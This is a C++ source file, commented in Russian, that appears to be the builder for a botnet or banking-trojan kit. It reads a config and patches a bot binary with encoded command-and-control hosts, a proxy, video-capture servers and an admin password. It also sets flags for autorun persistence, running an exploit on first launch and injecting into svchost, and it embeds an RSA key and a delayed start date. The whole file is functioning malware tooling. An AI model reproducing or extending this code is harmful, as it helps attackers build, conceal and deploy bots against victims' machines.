#include "stdafx.h"

#include "main.h"
#include "core\file.h"
#include "core\rand.h"
#include "builder.h"
#include <math.h>
#include <stdlib.h>

uint DateToInt( const char* s );

void GetHosts( StringBuilder& value, StringArray& hosts, Config* cfg )
{
	StringArray hh = value.Split(',');
	for( int i = 0; i < hh.Count(); i++ )
	{
		StringBuilder& s = hh[i]->Trim();
		if( s.IndexOf('-') > 0 && s.IndexOf(':') > 0 ) // это дата после которой можно конеектиться с сервером
		{
			cfg->dateWork = s;
		}
		else
			hosts.Add(*hh[i]);
	}
}

Config* ReadConfig( const char* fileName )
{
	Mem::Data data;
	if( !File::ReadAll( fileName, data ) )
	{
		printf( "ERROR: not open file config: %s\n", fileName );
		return 0;
	}
	Config* cfg = new Config();
	cfg->autorun = true; //по умолчанию (если не указан параметр) делается инсталяция автозапуска
	cfg->sployty = true; //по умолчанию (если не указан параметр) запускается сплойт при 1-м запуске бота
	cfg->check_dublication = true; //по умолчанию делается проверка на запуск копии
	cfg->plugins_server = false; //по умолчанию плагины грузятся с админки
	cfg->not_used_svchost = false; //по умолчанию для работы запускаем свцхост и инжектимся в него
	StringBuilder content(data);
	StringArray ss = content.Split("\r\n", 2);
	bool keysLoaded = false; //загружены ли ключи
	for( int i = 0; i < ss.Count(); i++ )
	{
		StringBuilder& s = ss[i];
		s.Trim();
		if( s.IsEmpty() ) //пустая строка
			continue;
		if( s[0] == '/' && s[1] == '/' ) //комментарии игнорируем
			continue;
		int p = s.IndexOf('=');
		StringBuilder param, value;
		s.Substring( param, 0, p );
		s.Substring( value, p + 1 );
		param.Trim().Lower();
		value.Trim();
		if( param == "prefix" )
		{
			cfg->prefix = value;
		}
		else if( param == "hosts" )
		{
			GetHosts( value, cfg->hosts, cfg );
		}
		else if( param == "proxy" )
		{
			cfg->proxy = value;
		}
		else if( param == "hosts_az" )
		{
			GetHosts( value, cfg->hosts_az, cfg );
		}
		else if( param == "user_az" )
		{
			cfg->user_az = value;
		}
		else if( param == "video_hosts" )
		{
			GetHosts( value, cfg->video_hosts, cfg );
		}
		else if( param == "video_svchost" )
		{
			cfg->video_svchost = value[0] == '0' ? false : true;
		}
		else if( param == "video_run" )
		{
			cfg->video_run = value[0] == '0' ? false : true;
		}
		else if( param == "video_timeout" )
		{
			cfg->video_timeout = value.ToInt();
			if( cfg->video_timeout < 0 )
				cfg->video_timeout = 0;
			else 
				if( cfg->video_timeout > 999 ) cfg->video_timeout = 999; //максимум 3 знака может быть в минутах
		}
		else if( param == "password" )
		{
			cfg->password = value;
		}
		else if( param == "period" )
		{
			cfg->period = value.ToInt() * 60; //переводим в секунды
		}
		else if( param == "autorun" )
		{
			cfg->autorun = value[0] == '0' ? false : true;
		}
		else if( param == "sployty" )
		{
			cfg->sployty = value[0] == '0' ? false : true;
		}
		else if( param == "check_dublication" )
		{
			cfg->check_dublication = value[0] == '0' ? false : true;
		}
		else if( param == "plugins_server" )
		{
			cfg->plugins_server = value[0] == '0' ? false : true;
		}
		else if( param == "not_used_svchost" )
		{
			cfg->not_used_svchost = value[0] == '0' ? false : true;
		}
		else if( param == "public_key" )
		{
			File::ReadAll( value, cfg->publicKey );
			keysLoaded = true;
		}
	}
	if( !keysLoaded )
		GenRSAKeys( cfg->publicKey, cfg->privateKey );
	EncodeRSAKey( cfg->publicKey, cfg->encodedKey );
	return cfg;
}

static bool ReplaceMem( Mem::Data& data, const byte* field, int lenField, const byte* value, int c_value )
{
	if( lenField < 0 ) lenField = Str::Len((char*)field);
	int p = data.IndexOf( field, lenField );
	if( p >= 0 )
	{
		data.Copy( p, 0, c_value, value, c_value );
		return true;
	}
	return false;
}

//ищет в массиве параметр field и заменяет его на value, размер выделенный для параметра в файле передается в sizeField
static bool ReplaceString( Mem::Data& data, const char* field, int sizeField, const char* value, const char* origValue, int lenValue = -1 )
{
	if( lenValue < 0 ) lenValue = Str::Len(value);
	if( lenValue >= sizeField )
	{
		printf( "ERROR: for field '%s' not enough memory (size %d) for value '%s' (len = %d)\n", field, sizeField, value, lenValue );
		return false;
	}
	int lenField = Str::Len(field);
	StringBuilder s(sizeField);
	Rand::Gen( s, sizeField - 1 );
	s.Copy( value, lenValue );
	if( ReplaceMem( data, (byte*)field, lenField, (byte*)s.c_str(), sizeField ) )
	{
		printf( "%s replaced by %s\n", field, origValue );
		return true;
	}
	else
		printf( "ERROR: field '%s' not found\n", field );
	return false;
}

bool EncodeReplaceString( Mem::Data& data, const char* mask, int maxSize, const char* value )
{
	int c_value = Str::Len(value);
	//если кодируемая строка пустая, то кодировать не нужно, просто записывается 0
	int sz_buf = c_value + (c_value > 0 ? CountStringOpcode : 0) + 1;
	char* buf = Str::Alloc(sz_buf);
	EncodeString( value, buf, c_value );
	bool ret = ReplaceString( data, mask, maxSize, buf, value, sz_buf - 1 );
	Str::Free(buf);
	return ret;
}

bool SetHosts( Mem::Data& data, const char* mask, int maxSize, StringArray& cfgHosts )
{
	StringBuilder hosts;
	for( int i = 0; i < cfgHosts.Count(); i++ )
	{
		if( i > 0 ) hosts += '|';
		hosts += cfgHosts[i];
	}
	EncodeReplaceString( data, mask, maxSize, hosts );
	return true;
}

bool SetConfig( Config* cfg, Mem::Data& data )
{
	EncodeReplaceString( data, MASK_PREFIX_NAME, MaxSizePrefix, cfg->prefix );
	SetHosts( data, MASK_ADMIN_PANEL_HOSTS, MaxSizeHostAdmin, cfg->hosts );
	EncodeReplaceString( data, MASK_PROXY, MaxSizeProxy, cfg->proxy );
	SetHosts( data, MASK_ADMIN_AZ, MaxSizeHostAdmin, cfg->hosts_az );
	EncodeReplaceString( data, MASK_USER_AZ, MaxSizeUserAZ, cfg->user_az );
	SetHosts( data, MASK_VIDEO_SERVER_IP, MaxSizeIpVideoServer, cfg->video_hosts );
	char paramVideo[MaxFlagsVideoServer];
	Mem::Set( paramVideo, 0, MaxFlagsVideoServer );
	paramVideo[0] = cfg->video_svchost ? '1' : '0';
	paramVideo[1] = cfg->video_run ? '1' : '0';
	char textMin[8];
	int lenMin = Str::ToString( cfg->video_timeout, textMin );
	if( lenMin > 5 ) lenMin = 5; //максимум 5 знаков
	int i = 0;
	for( ;i < 5 - lenMin; i++ ) paramVideo[2 + i] = '0'; //выравниваем, чтобы в начале были нули
	Mem::Copy( &paramVideo[2 + i], textMin, lenMin );
	EncodeReplaceString( data, MASK_FLAGS_VIDEO_SERVER, MaxFlagsVideoServer, paramVideo );
	EncodeReplaceString( data, MASK_ADMIN_PASSWORD, MaxSizePasswordAdmin, cfg->password );
	char period[16];
	Str::ToString( cfg->period, period );
	EncodeReplaceString( data, MASK_PERIOD_CONTACT, MaxSizePeriodConnect, period );
	
	char miscState[MaxSizeMiscState];
	Mem::Set( miscState, 0, sizeof(miscState) );
	miscState[0] = cfg->autorun ? '1' : '0';
	miscState[1] = cfg->sployty ? '1' : '0';
	miscState[2] = cfg->check_dublication ? '1' : '0';
	miscState[3] = cfg->plugins_server ? '1' : '0';
	miscState[4] = cfg->not_used_svchost ? '1' : '0';
	EncodeReplaceString( data, MASK_MISC_STATE, MaxSizeMiscState, miscState );

	if( ReplaceMem( data, (byte*)MASK_PUBLIC_KEY, -1, cfg->encodedKey.p_byte(), cfg->encodedKey.Len() ) )
		printf( "RSA public key saved\n" );
	else
		printf( "ERROR saved RSA public key\n" );
	

	uint dateWork = 0;
	if( !cfg->dateWork.IsEmpty() )
	{
		dateWork = DateToInt(cfg->dateWork);
		if( dateWork == 0 )
			printf( "ERROR date start work\n" );
	}
	StringBuilderStack<16> dateWork_s;
	dateWork_s.Format( "%d", dateWork );
	printf( "date start work %s -> %s\n", cfg->dateWork.c_str(), dateWork_s.c_str() );
	EncodeReplaceString( data, MASK_DATE_WORK, MaxSizeDateWork, dateWork_s );

	return true;
}

bool IsPrime( ushort v )
{
	int n = sqrt((double)v);
	for( int i = 2; i <= n; i++ )
	if( (v % i) == 0 )
		return false;
	return true;
}

void GenRandABR( Config* cfg )
{
	int min = 10000, max = 65535;
	ushort* primes = new ushort[max - min + 1];
	//генерируем простые числа
	int n = 0;
	for( int v = min; v <= max; v++ )
		if( IsPrime(v) )
			primes[n++] = v;
	//выбираем два простых числа
	cfg->A = primes[ rand() % n ];
	cfg->B = primes[ rand() % n ];
	cfg->R = rand() & 0xffff;
	printf( "Params rand func for encode strings: A = %d, B = %d, R = %d\n", cfg->A, cfg->B, cfg->R );
	delete primes;
}

void SetRandVector( Config* cfg, Mem::Data& data )
{
	int n = MaxSizeRandVector - sizeof(ushort) * 3;
	for( int i = 0; i < n; i++ )
		cfg->RandVector[i] = rand() % 0xff;
	GenRandABR( cfg );
	*((ushort*)&cfg->RandVector[n]) = cfg->R;
	*((ushort*)&cfg->RandVector[n + 2]) = cfg->A;
	*((ushort*)&cfg->RandVector[n + 4]) = cfg->B;
	ReplaceMem( data, (byte*) MASK_RAND_VECTOR, -1, cfg->RandVector, MaxSizeRandVector );
}

uint DateToInt( const char* s )
{
	char d[32];
	d[0] = 0;
	strcat( d, s);
	if( d[2] != '.' ) return 0;
	d[2] = 0;
	int day = Str::ToInt(&d[0]);
	if( d[5] != '.' ) return 0;
	d[5] = 0;
	int month = Str::ToInt(&d[3]);
	int hour = 0, minute = 0;
	if( d[10] == '-' ) //есть часы и минуты
	{
		if( d[13] != ':' ) return 0;
		d[13] = 0;
		d[16] = 0;
		hour = Str::ToInt(&d[11]);
		minute = Str::ToInt(&d[14]);
	}
	d[10] = 0;
	int year = Str::ToInt(&d[6]);
	if( day < 1 || day > 31 || month < 1 || month > 12 || year < 2016 || year > 2026 || hour < 0 || hour > 24 || minute < 0 || minute > 60 ) return 0;
	return (((((((year << 4) | month) << 5) | day) << 5) | hour) << 6) | minute;
}
